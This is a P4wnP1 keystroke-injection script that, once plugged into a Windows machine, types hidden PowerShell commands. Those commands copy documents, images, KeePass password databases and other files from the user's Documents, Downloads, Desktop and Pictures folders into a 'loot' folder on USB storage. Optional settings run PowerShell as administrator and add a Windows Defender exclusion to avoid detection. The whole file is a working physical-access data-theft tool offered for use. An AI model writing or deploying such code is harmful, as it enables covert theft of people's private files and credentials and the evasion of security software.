/*###################################################################################################################################\
# user_files_exfil.js                                                                                                                #
#   Extraction of user files from specified folders and file extensions.                                                             #
#   Save to additional USB/SSD or to P4wnP1 mass storage.                                                                            #                                                                                                  #
#                                                                                                                                    #
#   Author: cac3r (from chriskalv original "allinOne_extraction.js" script)                                                          #
#                                                                                                                                    #
# PREREQUISTES:                                                                                                                      #
# - Enable keyboard capability and, if you want to extract directly to P4wnP1's microSD, USB mass storage capability in settings.    #  
# - Edit global settings below.                                                                                                      #
\###################################################################################################################################*/

////////////////////////// GLOBAL SETTINGS ///////////////////////////////////////\
// GENERAL                                                                       // ---
layout("us");                                                                    // Keyboard layout
typingSpeed(0,0);                                                                // Typing = really fast
run_as_admin=false;                                                              // Set to true to execute powershell as Administrator
extract_to_ssd=true;                                                             // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
hide=true;                                                                       // Set to true to hide the console window on the target
exit=true;                                                                       // Set to true to exit the console once finished
modify_defender=false;                                                           // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
var usb_drive = "TEMPUSB"                                                        // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
var ssd_drive = "USB_OUT";                                                       // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
// FILES EXTRACTION                                                              // ---
extract_files=true;                                                              // Set to true to enable the extraction of files
var user_subfolder1 = ["Documents"]                                              // The first folder inside the home user directory to be inspected
var user_subfolder2 = ["Downloads"]                                              // The second
var user_subfolder3 = ["Desktop"]                                                // ...
var user_subfolder4 = ["Pictures"]                                               // ...
var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png", "kdbx", "db"]  // The filetypes to extract from previously specified folders in the home directory (Add .xlm, .bak, .zip, and any other you find interesting)
//////////////////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
            delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Identify path/directory names
    if (extract_to_ssd) {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    } else {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
    type("\n");
    delay(1000);
  
  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }
    
  // Create directories
    if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");
    type("\n");
    delay(50);
   
  // Copy files of specified filetypes from specified folders (depth: 4 directories)
    if (extract_files) {
        type("$home_directory = Get-Variable HOME -valueOnly;");
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
        }  
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
        }
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder3 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
        }
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder4 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")
        }
    }
  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();